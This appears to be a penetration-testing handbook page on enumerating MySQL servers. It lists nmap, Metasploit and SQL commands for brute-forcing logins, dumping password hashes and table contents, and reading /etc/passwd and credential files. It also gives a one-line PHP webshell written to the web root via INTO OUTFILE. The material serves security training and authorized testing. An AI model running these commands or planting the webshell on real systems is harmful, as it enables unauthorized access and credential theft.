% Filename: 02-reconnaissance/enum-database/mysql.md
% Display name: MySQL Enumeration
% Last update: 2026-02-09
% ATT&CK Tactics: TA0043 (Reconnaissance)
% ATT&CK Techniques: T1595 (Active Scanning)
% Authors: @TristanInSec

# MySQL Enumeration

## Overview

MySQL runs on TCP 3306 by default. Enumeration targets version detection, authentication testing, database/table listing, credential extraction, and file read/write capabilities. MySQL exposed to the network is a high-value target — default credentials, weak passwords, and anonymous access are common findings.

## ATT&CK Mapping

- **Tactic:** TA0043 - Reconnaissance
- **Technique:** T1595 - Active Scanning

## Prerequisites

- Network access to target TCP 3306
- `mysql` client, Nmap, or Metasploit installed

## Enumeration Techniques

### Service Detection

```bash
# Nmap
# https://nmap.org/
nmap -sV -p 3306 <target>
```

Expected output:
```text
3306/tcp open  mysql  MySQL 8.0.32-0ubuntu0.22.04.2
```

The version string often reveals the OS (Ubuntu, CentOS) and MySQL variant (MySQL, MariaDB, Percona).

### Nmap NSE Scripts

```bash
# Nmap
# https://nmap.org/
# Enumerate valid usernames via authentication bug (CVE-2012-5615, MySQL 5.x)
nmap -p 3306 --script mysql-enum <target>

# Get server info without authentication
nmap -p 3306 --script mysql-info <target>

# Check for empty root password
nmap -p 3306 --script mysql-empty-password <target>

# Enumerate users
nmap -p 3306 --script mysql-users --script-args mysqluser=root,mysqlpass='' <target>

# Enumerate databases
nmap -p 3306 --script mysql-databases --script-args mysqluser=root,mysqlpass='' <target>

# Dump password hashes
nmap -p 3306 --script mysql-dump-hashes --script-args username=root,password='' <target>

# Check for writable variables
nmap -p 3306 --script mysql-variables --script-args mysqluser=root,mysqlpass='' <target>

# Audit configuration
nmap -p 3306 --script mysql-audit --script-args "mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" <target>

# Brute-force
nmap -p 3306 --script mysql-brute <target>

# Run all MySQL scripts
nmap -p 3306 --script "mysql-*" <target>
```

### MySQL Client Connection

```bash
# Connect with credentials
mysql -u <user> -p<password> -h <target>

# Connect with empty password
mysql -u root -h <target>

# Execute query directly (no interactive session)
mysql -u <user> -p<password> -h <target> -e 'show databases;'
```

### Database Enumeration

Once connected, enumerate the environment:

```sql
-- Server version and OS
SELECT @@version;
SELECT @@version_compile_os;

-- Current user and privileges
SELECT user();
SELECT current_user();
SHOW GRANTS;
SHOW GRANTS FOR 'root'@'localhost';

-- List all databases
SHOW DATABASES;

-- List all tables in a database
USE <database>;
SHOW TABLES;

-- Describe table structure
DESCRIBE <table>;

-- Dump table contents
SELECT * FROM <database>.<table>;

-- List all users and password hashes
SELECT user, host, authentication_string FROM mysql.user;
```

From your old notes, the one-liner approach still works:

```bash
mysql -u<user> -p<password> -h <target> -e 'show databases;'
mysql -u<user> -p<password> -h <target> -e 'show tables from <database>;'
mysql -u<user> -p<password> -h <target> -e 'select * from <database>.<table>;'
```

### Credential Extraction

```sql
-- MySQL 5.7+
SELECT user, host, authentication_string FROM mysql.user;

-- MySQL 5.6 and earlier
SELECT user, host, password FROM mysql.user;

-- MariaDB
SELECT user, host, password FROM mysql.user;
```

Hashes can be cracked with Hashcat (mode 300 for MySQL 4.1+ hashes, mode 200 for older MySQL hashes) or John the Ripper.

### File Read/Write

If the MySQL user has `FILE` privilege:

```sql
-- Read a file from the server filesystem
SELECT LOAD_FILE('/etc/passwd');

-- Write a file (requires writable directory and secure_file_priv not set)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Check secure_file_priv (empty = no restriction, NULL = disabled)
SHOW VARIABLES LIKE 'secure_file_priv';
```

`secure_file_priv` is the main control. If set to a directory, file operations are restricted to that path. If empty, any path is writable. If NULL, file operations are disabled entirely.

### User Defined Functions (UDF)

If FILE privilege is available and the plugin directory is writable, UDF can provide command execution:

```sql
-- Check plugin directory
SHOW VARIABLES LIKE 'plugin_dir';

-- Check architecture (for correct UDF binary)
SHOW VARIABLES LIKE '%compile%';
```

UDF exploitation is covered in detail in the exploitation section. The enumeration step is confirming the plugin directory path and write access.

### Configuration Files

Key files to look for during post-exploitation:

| File | Location | Contains |
|------|----------|----------|
| my.cnf | /etc/mysql/my.cnf | Server configuration |
| my.cnf | /etc/my.cnf | Alternative location |
| debian.cnf | /etc/mysql/debian.cnf | Debian maintenance credentials |
| .my.cnf | ~/.my.cnf | Per-user saved credentials |
| mysql_history | ~/.mysql_history | Query history (may contain passwords) |

```bash
# Check for saved credentials in home directories
cat ~/.my.cnf
cat /etc/mysql/debian.cnf
cat ~/.mysql_history
```

The `debian.cnf` file on Debian/Ubuntu systems contains the `debian-sys-maint` user password, which typically has full privileges.

### Metasploit Modules

```bash
# Metasploit
# https://www.metasploit.com/
# Version detection
auxiliary/scanner/mysql/mysql_version

# Login testing
auxiliary/scanner/mysql/mysql_login

# Enumeration (requires valid creds)
auxiliary/admin/mysql/mysql_enum

# Schema dump
auxiliary/scanner/mysql/mysql_schemadump

# Hash dump
auxiliary/scanner/mysql/mysql_hashdump

# File read
auxiliary/admin/mysql/mysql_sql
```

## Post-Enumeration

With MySQL access, prioritize:
- Password hashes from `mysql.user` for offline cracking
- Credential reuse — test extracted passwords against SSH, SMB, and other services
- Configuration files (`debian.cnf`, `.my.cnf`) for additional credentials
- FILE privilege for reading sensitive files (`/etc/shadow`, web app configs)
- Webshell via `INTO OUTFILE` if FILE privilege and a web-accessible directory exist
- Database contents — look for application credentials, user data, API keys

## References

### Official Documentation

- [MySQL Reference Manual](https://dev.mysql.com/doc/)
- [MySQL Adding a Loadable Function](https://dev.mysql.com/doc/extending-mysql/8.0/en/adding-loadable-function.html)
- [Nmap mysql-info NSE Script](https://nmap.org/nsedoc/scripts/mysql-info.html)
- [Nmap mysql-brute NSE Script](https://nmap.org/nsedoc/scripts/mysql-brute.html)
- [Rapid7 — Metasploit Guide: MySQL](https://docs.metasploit.com/docs/pentesting/metasploit-guide-mysql.html)

### Pentest Guides & Research

- [Hacking Articles — MySQL Penetration Testing with Nmap](https://www.hackingarticles.in/mysql-penetration-testing-nmap/)
- [Exploit-DB — MySQL UDF Exploitation (Osanda Malith Jayathissa)](https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf)
- [Juggernaut-Sec — MySQL User Defined Functions: Linux Privilege Escalation](https://juggernaut-sec.com/mysql-user-defined-functions/)

### CVE References

- [Exploit-DB 1518 — MySQL 4.x/5.x UDF Local Privilege Escalation](https://www.exploit-db.com/exploits/1518)

### MITRE ATT&CK

- [T1595 — Active Scanning](https://attack.mitre.org/techniques/T1595/)
- [T1505.003 — Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/)
